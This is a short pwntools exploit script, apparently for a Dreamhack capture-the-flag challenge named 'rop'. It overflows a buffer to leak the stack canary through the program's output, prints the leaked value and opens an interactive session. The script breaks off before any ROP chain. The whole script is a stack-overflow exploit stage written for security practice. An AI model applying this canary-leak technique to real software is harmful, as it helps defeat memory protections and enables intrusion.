from pwn import *
def slog(name, addr): return success(': '.join([name, hex(addr)]))


e= ELF('/libc.so.6')
#p= remote("host3.dreamhack.games",21198)
p = process("rop")
buf = b'A'*0x38
p.sendafter('Buf: ',buf+b'A')
p.recvuntil(buf+b'A')
canary = u64(b'\x00'+p.recv(7))
slog('canary',canary)

p.interactive()